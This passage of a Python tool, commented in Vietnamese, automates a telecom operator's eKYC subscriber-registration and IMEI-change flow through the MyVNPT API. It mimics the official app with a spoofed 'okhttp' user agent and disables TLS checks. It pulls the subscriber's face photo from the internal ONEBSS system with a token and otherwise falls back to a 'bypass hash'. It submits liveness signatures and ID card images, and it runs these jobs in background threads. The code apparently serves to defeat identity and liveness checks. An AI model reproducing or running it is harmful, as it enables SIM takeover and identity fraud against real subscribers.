        if cccd.get("nfc_data"):
            verify_request["nfcData"] = json.dumps(cccd["nfc_data"])
        # Chữ ký điện tử → thêm nếu có
        if cccd.get("digital_sig"):
            verify_request["digitalSignature"] = cccd["digital_sig"]

        verify_headers = {
            "Cache-Control": "no-cache",
            "Device-Info":   self.device_info,
            "Language":      "vi_VN",
            "Authorization": self.bearer_token,
            "User-Agent":    "okhttp/4.7.2",
        }

        verify_json_str = json.dumps(verify_request, ensure_ascii=False)
        face_bytes_data = face_bytes or b""

        verify_files = [
            ("request",       (None, verify_json_str, "application/json; charset=utf-8")),
            ("frontImage",    ("front.jpg",  cccd.get("_front_bytes", b""),  "image/jpg")),
            ("backImage",     ("back.jpg",   cccd.get("_back_bytes",  b""),  "image/jpg")),
            ("portraitImage", ("face.jpg",   face_bytes_data,                "image/jpg")),
        ]

        for attempt in range(2):
            try:
                r = self._session.post(
                    f"{MYVNPT_BASE}/tel_service/imei/verifyImeiChange",
                    headers=verify_headers,
                    files=verify_files,
                    timeout=120, verify=False
                )
                resp = r.json()
                ec   = resp.get("errorCode", "")
                result_v = resp.get("result", {}) or {}

                if ec in ("0", "00"):
                    self.log(f"[9/9] ✅ ĐKTTTB THÀNH CÔNG! — {result_v.get('fullName', '')}")
                    return True, result_v
                elif ec in ("1312", "1303"):
                    self.log(f"[9/9] ✅ ĐÃ HOÀN THÀNH TRƯỚC ĐÓ (ec={ec})")
                    return True, result_v
                else:
                    self.log(f"[9/9] ❌ FAILED: ec={ec} | {resp.get('message')}")
                    return False, {"error": resp.get("message", ""), "errorCode": ec}
            except Exception as ex:
                self.log(f"[9/9] attempt {attempt+1} error: {ex}")
                if attempt == 0:
                    time.sleep(3)
        return False, {"error": "timeout/connection error"}

    # ── MAIN FLOW ────────────────────────────────────────────────────────────
    def run(
        self,
        face_bytes:        bytes | None = None,
        cccd_front_bytes:  bytes | None = None,
        cccd_back_bytes:   bytes | None = None,
        nfc_data:          dict  | None = None,
        digital_sig:       bytes | None = None,
        onebss_token:      str = "",
    ) -> dict:
        """
        Chạy toàn bộ luồng ĐKTTTB.
        Trả về dict: {success, already_done, result, error, steps}
        """
        out = {"success": False, "already_done": False, "result": {}, "error": "", "steps": {}}

        # Bước 1: initDevice
        if not self.step_init_device():
            out["error"] = "initDevice failed"
            return out

        # Bước 2: authen_msisdn
        if not self.step_authen():
            out["error"] = "Authentication failed"
            return out

        # Nếu không có ảnh mặt, thử tải từ ONEBSS
        if not face_bytes and onebss_token:
            self.log(f"[AUTO] Không có ảnh upload → thử tải từ ONEBSS ({self.phone_fmt})...")
            face_bytes = fetch_face_from_onebss(self.phone_fmt, onebss_token)
            if face_bytes:
                self.log(f"[AUTO] ✅ Tải ảnh ONEBSS OK ({len(face_bytes)//1024}KB)")
            else:
                self.log("[AUTO] ⚠️ Không tải được ảnh từ ONEBSS, dùng bypass hash")

        # Bước 3: checkImeiChange
        ok, already_done, res = self.step_check_imei()
        if not ok:
            out["error"] = "checkImeiChange failed"
            return out
        if already_done:
            out["success"] = True
            out["already_done"] = True
            out["result"] = res
            return out

        # Bước 4: getChallengeCode
        if not self.step_get_challenge():
            out["error"] = "getChallengeCode failed"
            return out

        # Bước 5: Face mask
        mask_b64, mask_sign = self.step_face_mask(face_bytes)
        out["steps"]["mask"] = bool(mask_sign)

        # Bước 6: Liveness 3D
        live_b64, live_sign, live_text = self.step_liveness_3d()
        out["steps"]["liveness"] = bool(live_sign)

        if not live_sign:
            out["error"] = "Liveness detection failed"
            return out

        # Bước 7: Upload CCCD (nếu có)
        cccd = {}
        if cccd_front_bytes or cccd_back_bytes:
            cccd = self.step_upload_cccd(cccd_front_bytes, cccd_back_bytes, nfc_data, digital_sig)
            # Lưu bytes gốc để gửi kèm verifyImeiChange
            cccd["_front_bytes"] = cccd_front_bytes or b""
            cccd["_back_bytes"]  = cccd_back_bytes  or b""
        else:
            self.log("[7/9] Bỏ qua upload CCCD (không có ảnh)")

        # Bước 8: saveLogEkyc
        self.step_save_log(live_b64, live_sign, mask_b64, mask_sign, cccd)
        out["steps"]["saveLog"] = True

        # Bước 9: verifyImeiChange
        success, result = self.step_verify(live_b64, live_sign, mask_b64, mask_sign, cccd, face_bytes)
        out["success"] = success
        out["result"]  = result
        if not success:
            out["error"] = result.get("error", "verifyImeiChange failed")

        return out


# ===========================================================================
# TASK MANAGER (in-memory, thread-safe)
# ===========================================================================
_tasks: dict[str, dict] = {}
_tasks_lock = threading.Lock()


def create_task() -> str:
    """Tạo task mới, trả về task_id."""
    task_id = uuid.uuid4().hex
    with _tasks_lock:
        _tasks[task_id] = {
            "status": "pending",
            "logs": [],
            "result": None,
            "created_at": time.time(),
        }
    return task_id


def get_task(task_id: str) -> dict | None:
    with _tasks_lock:
        return _tasks.get(task_id)


def _update_task(task_id: str, **kwargs):
    with _tasks_lock:
        if task_id in _tasks:
            _tasks[task_id].update(kwargs)


def run_dktttb_task(
    task_id: str,
    phone: str,
    password: str,
    otp: str = "",
    face_bytes:       bytes | None = None,
    cccd_front_bytes: bytes | None = None,
    cccd_back_bytes:  bytes | None = None,
    nfc_data:         dict  | None = None,
    digital_sig:      bytes | None = None,
    onebss_token:     str = "",
):
    """Chạy ĐKTTTB trong background thread, cập nhật task log realtime."""
    logs = []

    def log_cb(msg: str):
        logs.append({"t": round(time.time() - t0, 2), "msg": msg})
        _update_task(task_id, logs=list(logs))

    t0 = time.time()
    _update_task(task_id, status="running", logs=logs)
    try:
        runner = EkycRunner(phone, password, otp, log_cb=log_cb)
        result = runner.run(
            face_bytes=face_bytes,
            cccd_front_bytes=cccd_front_bytes,
            cccd_back_bytes=cccd_back_bytes,
            nfc_data=nfc_data,
            digital_sig=digital_sig,
            onebss_token=onebss_token,
        )
        _update_task(
            task_id,
            status="done",
            result=result,
            logs=list(logs),
            elapsed=round(time.time() - t0, 1),
        )
    except Exception as ex:
        import traceback
        log_cb(f"[EXCEPTION] {ex}\n{traceback.format_exc()[:500]}")
        _update_task(
            task_id,
            status="error",
            result={"success": False, "error": str(ex)},
            logs=list(logs),
            elapsed=round(time.time() - t0, 1),
        )


def start_dktttb_background(
    phone: str, password: str, otp: str = "",
    face_bytes: bytes | None = None,
    cccd_front_bytes: bytes | None = None,
    cccd_back_bytes:  bytes | None = None,
    nfc_data: dict | None = None,
    digital_sig: bytes | None = None,
    onebss_token: str = "",
) -> str:
    """Tạo task và chạy background. Trả về task_id để polling."""
    task_id = create_task()
    t = threading.Thread(
        target=run_dktttb_task,
        kwargs=dict(
            task_id=task_id, phone=phone, password=password, otp=otp,
            face_bytes=face_bytes,
            cccd_front_bytes=cccd_front_bytes,
            cccd_back_bytes=cccd_back_bytes,
            nfc_data=nfc_data,
            digital_sig=digital_sig,
            onebss_token=onebss_token,
        ),
        daemon=True,
    )
    t.start()
    return task_id


def cleanup_old_tasks(max_age_seconds: int = 3600):
    """Xóa tasks cũ hơn max_age_seconds."""
    now = time.time()
    with _tasks_lock:
        old_ids = [tid for tid, t in _tasks.items()
                   if now - t.get("created_at", 0) > max_age_seconds]
        for tid in old_ids:
            del _tasks[tid]
